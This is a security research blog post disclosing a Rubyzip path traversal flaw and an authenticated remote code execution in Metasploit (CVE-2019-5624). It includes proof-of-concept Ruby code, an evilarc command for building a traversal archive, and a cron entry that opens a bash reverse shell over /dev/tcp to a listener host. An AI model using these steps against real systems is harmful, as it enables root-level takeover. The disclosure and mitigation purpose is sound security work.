<!DOCTYPE html>
<html lang="en-us">

  <head>
  <!-- Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-164212227-2"></script>
  <script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-164212227-2');
  </script>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" /><![endif]-->
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Doyensec's Blog :: Doyensec is an independent security research and development company focused on vulnerability discovery and remediation." />
  <meta name="keywords" content="doyensec, doyensecurity, security, infosec, vulnerability, exploit, offensive, pentest, pentester, hacking, auditing, reverse engineering, automation" />
  <meta name="robots" content="index, follow" />
  <meta name="robots" content="noodp" />
  <meta name="robots" content="noydir" />

  <title>
    
      On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624) &middot; Doyensec's Blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/images/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/public/images/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class="theme-base-doyensec">

    <div class="sidebar">
  <div class="navbar-brand"><a href="/index.html"><img src="/public/images/logo.png" class="navbar-brand__image"></a></div>
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <p class="lead">We are <a href="https://doyensec.com" target="_blank">security engineers</a> who break bits and tell stories.<br><br>Visit us<br><a href="https://doyensec.com" target="_blank">doyensec.com</a><br><br>Follow us<br><a href="https://twitter.com/doyensec" target="_blank">@doyensec</a><br><br>Engage us<br><a href="mailto:info@doyensec.com" target="_blank">info@doyensec.com</a><br><br></p>
    </div>

    <nav class="sidebar-nav">
      

      
      
        
          
        
      
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
    </nav>
    <h4 id="archive-header">Blog Archive</h4>
    <ul class="posts-archive">
            
            
            
              <li>
                <a class="yearBtn" data-year="2017" href="#">2017</a>
                <div class="postsMonths" id="posts-in-2017" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1511737200" data-url="/2017/11/27/we-are-hiring.html" data-title="We're hiring - Join Doyensec!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1510700400" data-url="/2017/11/15/osx-spotlight.html" data-title="Staring into the Spotlight"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1501711200" data-url="/2017/08/03/electron-framework-security.html" data-title="Modern Alchemy: Turning XSS into RCE"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1488409200" data-url="/2017/03/02/training-burp.html" data-title="Developing Burp Suite Extensions training"></span>
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2018" href="#">2018</a>
                <div class="postsMonths" id="posts-in-2018" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1541372400" data-url="/2018/11/05/burp-rest-api-v2.html" data-title="Introducing burp-rest-api v2"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1531951200" data-url="/2018/07/19/instrumenting-electron-app.html" data-title="Instrumenting Electron Apps for Security Testing"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1527112800" data-url="/2018/05/24/electron-win-protocol-handler-bug-bypass.html" data-title="Electron Windows Protocol Handler MITM/RCE (bypass for CVE-2018-1000006 fix)"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1526508000" data-url="/2018/05/17/graphql-security-overview.html" data-title="GraphQL - Security Overview and Testing Tips"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2019" href="#">2019</a>
                <div class="postsMonths" id="posts-in-2019" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1572908400" data-url="/2019/11/05/internship-at-doyensec.html" data-title="Internship at Doyensec"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1566424800" data-url="/2019/08/22/modern-password-managers-flag-secure.html" data-title="One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1564610400" data-url="/2019/08/01/common-crypto-bugs.html" data-title="Lessons in auditing cryptocurrency wallets, systems, and infrastructures"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1563746400" data-url="/2019/07/22/jackson-gadgets.html" data-title="Jackson gadgets - Anatomy of a vulnerability"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1562104800" data-url="/2019/07/03/electron-security-workshop.html" data-title="Electron Security Workshop"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1560204000" data-url="/2019/06/11/electronegativity-1.3.html" data-title="Electronegativity 1.3.0 released!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1556056800" data-url="/2019/04/24/rubyzip-bug.html" data-title="On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1554242400" data-url="/2019/04/03/subverting-electron-apps-via-insecure-preload.html" data-title="Subverting Electron Apps via Insecure Preload"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1548284400" data-url="/2019/01/24/electronegativity.html" data-title="Electronegativity is finally out!"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2020" href="#">2020</a>
                <div class="postsMonths" id="posts-in-2020" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1608159600" data-url="/2020/12/17/psychology-of-remote-work.html" data-title="Psychology of Remote Work"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1607554800" data-url="/2020/12/10/novel-abuses-wifi-direct-mobile-file-transfers.html" data-title="Novel Abuses On Wi-Fi Direct Mobile File Transfers"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1605740400" data-url="/2020/11/19/inql-scanner-v3.html" data-title="InQL Scanner v3 - Just Released!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1599602400" data-url="/2020/09/09/fuzzilli-jerryscript.html" data-title="Fuzzing JavaScript Engines with Fuzzilli"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1597874400" data-url="/2020/08/20/playframework-csrf-bypass.html" data-title="CSRF Protection Bypass in Play Framework"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1591826400" data-url="/2020/06/11/inql-scanner-v2.html" data-title="InQL Scanner v2 is out!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1589407200" data-url="/2020/05/14/asn1fuzz.html" data-title="Fuzzing TLS certificates from their ASN.1 grammar"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1588197600" data-url="/2020/04/30/polymorphic-images-for-xss.html" data-title="Researching Polymorphic Images for XSS on Google Scholar"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1586296800" data-url="/2020/04/08/libressl-fuzzer.html" data-title="LibreSSL and OSS-Fuzz"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1585177200" data-url="/2020/03/26/graphql-scanner.html" data-title="InQL Scanner"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1584313200" data-url="/2020/03/16/vscode_codeexec.html" data-title="Don't Clone That Repo: Visual Studio Code^2 Execution"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1583103600" data-url="/2020/03/02/gravitational-audit.html" data-title="2019 Gravitational Security Audit Results"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1582498800" data-url="/2020/02/24/electron-updater-update-signature-bypass.html" data-title="Signature Validation Bypass Leading to RCE In Electron-Updater"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1582066800" data-url="/2020/02/19/solokeys-audit.html" data-title="Security Analysis of the Solo Firmware"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1580684400" data-url="/2020/02/03/heap-exploit.html" data-title="Heap Overflow in F-Secure Internet Gatekeeper"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2021" href="#">2021</a>
                <div class="postsMonths" id="posts-in-2021" style="display:none">
                  
                    
                    
                    
                      <span class="post-entry" data-date="1621461600" data-url="/2021/05/20/graphql-csrf.html" data-title="That single GraphQL issue that you keep missing"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1615417200" data-url="/2021/03/11/regexploit.html" data-title="Regexploit: DoS-able Regular Expressions"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1613430000" data-url="/2021/02/16/electron-apis-misuse.html" data-title="Electron APIs Misuse: An Attacker’s First Choice"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
    </ul>
    <p>&copy; 2021 <a href="https://doyensec.com" target="_blank">Doyensec LLC.</a></p>
  </div>
</div>


    <div class="content container">
      <div class="post">
  <h1 class="post-title">On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)</h1>
  <span class="post-date">24 Apr 2019 - Posted by Luca Carettoni</span>
  <p>During one of our projects we had the opportunity to audit a Ruby-on-Rails (RoR) web application handling zip files using the <a href="https://github.com/Rubyzip/Rubyzip">Rubyzip</a> gem. Zip files have always been an interesting entry-point to triggering multiple vulnerability types, including path traversals and symlink file overwrite attacks. As the library under testing had symlink processing disabled, we focused on path traversal exploitation.</p>

<p><strong>This blog post discusses our results, the “bug” discovered in the library itself and the implication of such an issue in a popular piece of software - <a href="https://blog.rapid7.com/2019/04/19/metasploit-wrap-up-13/">Metasploit</a>.</strong></p>

<hr />

<h2 id="rubyzip-and-old-vulnerabilities">Rubyzip and old vulnerabilities</h2>

<p>The <em>Rubyzip</em> gem has a long history of path traversal vulnerabilities (<a href="https://github.com/Rubyzip/Rubyzip/issues/315">1</a>, <a href="https://github.com/Rubyzip/Rubyzip/issues/369">2</a>) through malicious filenames. Particularly interesting was the code change in PR <a href="https://github.com/Rubyzip/Rubyzip/pull/376">#376</a> where a different handling was implemented by the developers.</p>

<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Extracts entry to file dest_path (defaults to @name).</span>
<span class="c1"># NB: The caller is responsible for making sure dest_path is safe, </span>
<span class="c1"># if it is passed.</span>
<span class="k">def</span> <span class="nf">extract</span><span class="p">(</span><span class="n">dest_path</span> <span class="o">=</span> <span class="kp">nil</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">block</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">dest_path</span><span class="p">.</span><span class="nf">nil?</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">name_safe?</span>
        <span class="nb">puts</span> <span class="s2">"WARNING: skipped </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> as unsafe"</span>
        <span class="k">return</span> <span class="nb">self</span>
    <span class="k">end</span>

<span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Entry#name_safe</code> is defined <a href="https://github.com/Rubyzip/Rubyzip/blob/master/lib/zip/entry.rb#L112">a few lines before</a> as:</p>

<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Is the name a relative path, free of `..` patterns that could lead to</span>
<span class="c1"># path traversal attacks? This does NOT handle symlinks; if the path</span>
<span class="c1"># contains symlinks, this check is NOT enough to guarantee safety.</span>
<span class="k">def</span> <span class="nf">name_safe?</span>
    <span class="n">cleanpath</span> <span class="o">=</span> <span class="no">Pathname</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="vi">@name</span><span class="p">).</span><span class="nf">cleanpath</span>
    <span class="k">return</span> <span class="kp">false</span> <span class="k">unless</span> <span class="n">cleanpath</span><span class="p">.</span><span class="nf">relative?</span>
    <span class="n">root</span> <span class="o">=</span> <span class="o">::</span><span class="no">File</span><span class="o">::</span><span class="no">SEPARATOR</span>
    <span class="n">naive_expanded_path</span> <span class="o">=</span> <span class="o">::</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">cleanpath</span><span class="p">.</span><span class="nf">to_s</span><span class="p">)</span>
    <span class="n">cleanpath</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="n">root</span><span class="p">).</span><span class="nf">to_s</span> <span class="o">==</span> <span class="n">naive_expanded_path</span>
<span class="k">end</span>
</code></pre></div></div>

<p>In the code above, if the destination path is passed to the <code class="language-plaintext highlighter-rouge">Entry#extract</code> function then it is not actually checked. A <a href="https://github.com/Rubyzip/Rubyzip/blob/master/lib/zip/entry.rb#L160">comment</a> in the source code of that function highlights the user’s responsibility:</p>

<blockquote>
  <p># NB: The caller is responsible for making sure dest_path is safe, if it is passed.</p>
</blockquote>

<p>While the <code class="language-plaintext highlighter-rouge">Entry#name_safe</code> is a fair check against path traversals (and absolute paths), it is only executed when the function is called without arguments.</p>

<p>In order to verify the library bug we generated a ZIP PoC using the old (and still good) <a href="https://github.com/ptoomey3/evilarc">evilarc</a>, and extracted the malicious file using the following code:</p>

<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'zip'</span>

<span class="n">first_arg</span><span class="p">,</span> <span class="o">*</span><span class="n">the_rest</span> <span class="o">=</span> <span class="no">ARGV</span>

<span class="no">Zip</span><span class="o">::</span><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">first_arg</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">zip_file</span><span class="o">|</span>
  <span class="n">zip_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">entry</span><span class="o">|</span>
    <span class="nb">puts</span> <span class="s2">"Extracting </span><span class="si">#{</span><span class="n">entry</span><span class="p">.</span><span class="nf">name</span><span class="si">}</span><span class="s2">"</span>
    <span class="n">entry</span><span class="p">.</span><span class="nf">extract</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="nf">name</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> /tmp/file.txt
<span class="nb">ls</span>: cannot access <span class="s1">'/tmp/file.txt'</span>: No such file or directory
<span class="nv">$ </span>zipinfo absolutepath.zip 
Archive:  absolutepath.zip
Zip file size: 289 bytes, number of entries: 2
drwxr-xr-x  2.1 unx        0 bx stor 18-Jun-13 20:13 /tmp/
<span class="nt">-rw-r--r--</span>  2.1 unx        5 bX defN 18-Jun-13 20:13 /tmp/file.txt
2 files, 5 bytes uncompressed, 7 bytes compressed:  <span class="nt">-40</span>.0%
<span class="nv">$ </span>ruby Rubyzip-poc.rb absolutepath.zip 
Extracting /tmp/
Extracting /tmp/file.txt
<span class="nv">$ </span><span class="nb">ls</span> /tmp/file.txt
/tmp/file.txt
</code></pre></div></div>

<p>Resulting in a file being created in <em>/tmp/file.txt</em>, which confirms the issue.</p>

<p>As happened with our client, most developers might have upgraded to <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000544">Rubyzip 1.2.2</a> thinking it was safe to use without actually verifying how the library works or its specific usage in the codebase.</p>

<h2 id="it-would-have-been-vulnerable-anyway-_ツ_">It would have been vulnerable anyway <code class="language-plaintext highlighter-rouge">¯\_(ツ)_/¯</code></h2>

<p>In the context of our web application, the user-supplied zip was decompressed through the following (pseudo) code:</p>

<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">unzip</span><span class="p">(</span><span class="n">input</span><span class="p">)</span>
    <span class="n">uuid</span> <span class="o">=</span> <span class="n">get_uuid</span><span class="p">()</span>
    <span class="c1"># 0. create a 'Pathname' object with the new uuid</span>
    <span class="n">parent_directory</span> <span class="o">=</span> <span class="no">Pathname</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="no">ENV</span><span class="p">[</span><span class="s1">'uploads_dir'</span><span class="p">]</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">uuid</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

    <span class="no">Zip</span><span class="o">::</span><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="ss">:zip_file</span><span class="p">].</span><span class="nf">to_io</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">zip_file</span><span class="o">|</span>
        <span class="n">zip_file</span><span class="p">.</span><span class="nf">each_with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">entry</span><span class="p">,</span> <span class="n">index</span><span class="o">|</span>
            <span class="c1"># 1. check the file is not present</span>
            <span class="k">next</span> <span class="k">if</span> <span class="no">File</span><span class="p">.</span><span class="nf">file?</span><span class="p">(</span><span class="n">parent_directory</span> <span class="o">+</span> <span class="n">entry</span><span class="p">.</span><span class="nf">name</span><span class="p">)</span>
            <span class="c1"># 2. extract the entry</span>
            <span class="n">entry</span><span class="p">.</span><span class="nf">extract</span><span class="p">(</span><span class="n">parent_directory</span> <span class="o">+</span> <span class="n">entry</span><span class="p">.</span><span class="nf">name</span><span class="p">)</span>
        <span class="k">end</span>
    <span class="k">end</span>
    <span class="no">Success</span>
<span class="k">end</span>
</code></pre></div></div>

<p>In item #0 we can see that a <code class="language-plaintext highlighter-rouge">Pathname</code> object is created and then used as the destination path of the decompressed entry in item #2. However, the sum operator between objects and strings does not work as many developers would expect and might result in unintended behavior.</p>

<p>We can easily understand its behavior in an IRB shell:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>irb
irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; require <span class="s1">'pathname'</span>              
<span class="o">=&gt;</span> <span class="nb">true
</span>irb<span class="o">(</span>main<span class="o">)</span>:002:0&gt; parent_directory <span class="o">=</span> Pathname.new<span class="o">(</span><span class="s2">"/tmp/random_uuid/"</span><span class="o">)</span>
<span class="o">=&gt;</span> <span class="c">#&lt;Pathname:/tmp/random_uuid/&gt;</span>
irb<span class="o">(</span>main<span class="o">)</span>:003:0&gt; entry_path <span class="o">=</span> Pathname.new<span class="o">(</span>parent_directory + File.dirname<span class="o">(</span><span class="s2">"../../path/traversal"</span><span class="o">))</span>
<span class="o">=&gt;</span> <span class="c">#&lt;Pathname:/path&gt;</span>
irb<span class="o">(</span>main<span class="o">)</span>:004:0&gt; destination_folder <span class="o">=</span> Pathname.new<span class="o">(</span>parent_directory + <span class="s2">"../../path/traversal"</span><span class="o">)</span>
<span class="o">=&gt;</span> <span class="c">#&lt;Pathname:/path/traversal&gt;</span>
irb<span class="o">(</span>main<span class="o">)</span>:005:0&gt; parent_directory + <span class="s2">"../../path/traversal"</span>
<span class="o">=&gt;</span> <span class="c">#&lt;Pathname:/path/traversal&gt;</span>
</code></pre></div></div>

<p>Thanks to the interpretation of the <code class="language-plaintext highlighter-rouge">../</code> by <code class="language-plaintext highlighter-rouge">Pathname</code>, the argument to Rubyzip’s <code class="language-plaintext highlighter-rouge">Entry#extract</code> call does not contain any path traversal payloads which results in a mistakenly supposed “<em>safe</em>” path. Since the gem does not perform any validation, the exploitation does not even require this unexpected path concatenation.</p>

<h2 id="from-arbitrary-file-write-to-rce-ror-style">From Arbitrary File Write to RCE (RoR Style)</h2>

<p>Apart from the usual *nix and windows specific techniques (like writing a new cronjob or exploiting custom scripts), we were interested in understanding how we could leverage this bug to achieve RCE in the context of a RoR application.</p>

<p>Since our target was running in <em>production</em> environments, RoR classes were <a href="https://guides.rubyonrails.org/autoloading_and_reloading_constants.html#autoload-paths-and-eager-load-paths">cached on first usage</a> via the <em>cache_classes</em> directive. During the time allocated for the engagement we didn’t find a <strong>reliable</strong> way to load/inject arbitrary code at runtime via file write without requiring a RoR reboot.</p>

<p>However, we did verify in a local testing environment that chaining together a Denial of Service vulnerability and a full path disclosure of the web app root can be used to trigger the web server reboot and achieve RCE via the aforementioned zip handling vulnerability.</p>

<p>The official <a href="https://guides.rubyonrails.org/v2.3/configuring.html#using-initializers">documentation</a> explains that:</p>

<blockquote>
  <p>After it loads the framework plus any gems and plugins in your application, Rails turns to loading initializers. An initializer is any file of ruby code stored under /config/initializers in your application. You can use initializers to hold configuration settings that should be made after all of the frameworks and plugins are loaded.</p>
</blockquote>

<p>Using this feature, an attacker with the right privileges can add a malicious <code class="language-plaintext highlighter-rouge">.rb</code> in the <code class="language-plaintext highlighter-rouge">/config/initializers</code> folder which will be loaded at web server (re)boot.</p>

<h2 id="attacking-the-attackers-metasploit-authenticated-rce-cve-2019-5624">Attacking the attackers. Metasploit Authenticated RCE (CVE-2019-5624)</h2>

<p>Just after the end of the engagement and with the approval of our customer, we started looking at popular software that was likely affected by the Rubyzip bug. 
As we were brainstorming potential targets, an icon on one of our VMs caught our attention: <a href="https://www.metasploit.com/">Metasploit Framework</a></p>

<p>Going through the source code, we were able to quickly identify several files that are using the Rubyzip library to create ZIP files. Since our vulnerability resides in the <code class="language-plaintext highlighter-rouge">extract</code> function, we recalled an option to import a ZIP workspace from previous MSF versions or from different instances. We identified the corresponding code path in <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/db_manager/import/metasploit_framework/zip.rb">zip.rb</a> file <em>(line 157)</em> that is responsible for importing a Metasploit ZIP File:</p>

<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">data</span><span class="p">.</span><span class="nf">entries</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">e</span><span class="o">|</span>
      <span class="n">target</span> <span class="o">=</span> <span class="o">::</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="vi">@import_filedata</span><span class="p">[</span><span class="ss">:zip_tmp</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="nf">name</span><span class="p">)</span>
      <span class="n">data</span><span class="p">.</span><span class="nf">extract</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">target</span><span class="p">)</span>
</code></pre></div></div>

<p>As for the vanilla Rubyzip example, creating a ZIP file containing a path traversal payload and embedding a valid MSF workspace (an XML file containing the exported info from a scan) made it possible to obtain a reliable file-write primitive. Since the extraction is done as <code class="language-plaintext highlighter-rouge">root</code>, we could easily obtain remote command execution with high privileges using the following steps:</p>

<ol>
  <li>Create a file with the following content: <br /> <code class="language-plaintext highlighter-rouge">* * * * * root /bin/bash -c "exec /bin/bash 0&lt;/dev/tcp/172.16.13.144/4444 1&gt;&amp;0 2&gt;&amp;0 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/172.16.13.144/4445; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196"</code></li>
  <li>Generate the ZIP archive with the path traversal payload: <br /><code class="language-plaintext highlighter-rouge">python evilarc.py exploit --os unix -p etc/cron.d/</code></li>
  <li>Add a valid MSF workspace to the ZIP file (in order to have MSF to extract it, otherwise it will refuse to process the ZIP archive)</li>
  <li>Setup two listeners, one on port 4444 and the other on port 4445 (the one on port 4445 will get the reverse shell)</li>
  <li>Login in the MSF Web Interface</li>
  <li>Create a new “Project”</li>
  <li>Select “Import”, “From file”, chose the evil ZIP file and finally click the “Import” button</li>
  <li>Wait for the import process to finish</li>
  <li>Enjoy your reverse shell</li>
</ol>

<p><br /></p>

<video controls="" preload="auto" width="100%" height="100%" poster="../../../public/images/msf-zip.png">
    <source src="../../../public/images/msf-zip-bug.mp4" type="video/mp4" />
    Your browser does not support the video tag.
</video>

<h2 id="conclusions">Conclusions</h2>

<p>In case you are using <code class="language-plaintext highlighter-rouge">Rubyzip</code>, check the library usage and perform additional validation against the entry name and the destination path before calling <code class="language-plaintext highlighter-rouge">Entry#extract</code>.</p>

<p>Here is a small recap of the different scenarios (as of <code class="language-plaintext highlighter-rouge">Rubyzip v1.2.2</code>):</p>
<table>
    <tr>
        <th>Usage</th>
        <th>Input by user?</th>
        <th>Vulnerable to path traversal?</th>
    </tr>
    <tr>
        <td>entry.extract(path)</td>
        <td>yes (path)</td>
        <td><b>yes</b></td>
    </tr>
    <tr>
        <td>entry.extract(path)</td>
        <td>partially (path is concatenated)</td>
        <td><b>maybe</b></td>
    </tr>
    <tr>
        <td>entry.extract()</td>
        <td>partially (entry name)</td>
        <td>no</td>
    </tr>
    <tr>
        <td>entry.extract()</td>
        <td>no</td>
        <td>no</td>
    </tr>
</table>

<p>If you’re using Metasploit, it is <a href="https://blog.rapid7.com/2019/04/19/metasploit-wrap-up-13/">time to patch</a>. We look forward to seeing a msf module for CVE-2019-5624.</p>

<h2 id="credits-and-references">Credits and References</h2>

<p>Credit for the research and bugs go to <a href="https://twitter.com/void_sec">@voidsec</a> and <a href="https://twitter.com/polict_">@polict</a>.</p>

<p>This work has been performed during a customer engagement and <a href="https://doyensec.com/research.html">Doyensec 25% Research Time</a>.
As such, we would like to thank our customer and Metasploit maintainers for their support.</p>

<p>If you’re interested in the topic, take a look at the following resources:</p>

<ul>
  <li><a href="https://github.com/Rubyzip/Rubyzip">Rubyzip Library</a></li>
  <li><a href="https://guides.rubyonrails.org/">Ruby on Rails Guides</a></li>
  <li><a href="http://www.phrack.org/issues/69/12.html">Attacking Ruby on Rails Applications</a></li>
  <li><a href="http://www.phrack.org/issues/50/3.html">1997 Portable BBS Hacking (or when Zip Slip was actually invented)</a></li>
  <li><a href="https://labs.neohapsis.com/2009/04/21/directory-traversal-in-archives/">Evilarc blog post (or 2019 and this post is still relevant)</a></li>
</ul>


</div>
<div class="related">
  <h3>Other relevant posts:</h3> 
  <ul class="related-posts">
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
